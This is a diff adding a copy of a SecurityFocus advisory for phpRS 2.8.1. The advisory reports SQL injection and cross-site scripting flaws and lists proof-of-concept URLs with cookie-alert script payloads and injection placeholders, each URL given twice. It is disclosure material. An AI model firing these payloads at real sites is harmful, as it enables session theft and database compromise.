@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/49729/info
+
+phpRS is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+phpRS 2.8.1 is vulnerable; other versions may also be affected.
+
+http://www.example.com/phpRS Path/view.php?cisloclanku=1%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+http://www.example.com/phpRS Path/search.php?rstema=%3Cbody%20onload%3dalert%28document.cookie%29%3E&rstext=all-phpRS-all&rsvelikost=sab
+
+http://www.example.com/phpRS Path/index.php?strana=%24%7binjecthere%7d
+
+http://www.example.com/phpRS Path/search.php?rstema=%24%7binjecthere%7d&rstext=all-phpRS-all&rsvelikost=sab
+
+http://www.example.com/phpRS Path/search.php?rstema=7&rstext=all-phpRS-all&rsvelikost=sab&stromhlmenu=%24%7binjecthere%7d 
+
+http://www.example.com/phpRS Path/view.php?cisloclanku=1%3Cscript%3Ealert%28document.cookie%29%3C/script%3E 
+
+http://www.example.com/phpRS Path/search.php?rstema=%3Cbody%20onload%3dalert%28document.cookie%29%3E&rstext=all-phpRS-all&rsvelikost=sab
+
+http://www.example.com/phpRS Path/index.php?strana=%24%7binjecthere%7d
+
+http://www.example.com/phpRS Path/search.php?rstema=%24%7binjecthere%7d&rstext=all-phpRS-all&rsvelikost=sab 
+
+http://www.example.com/phpRS Path/search.php?rstema=7&rstext=all-phpRS-all&rsvelikost=sab&stromhlmenu=%24%7binjecthere%7d
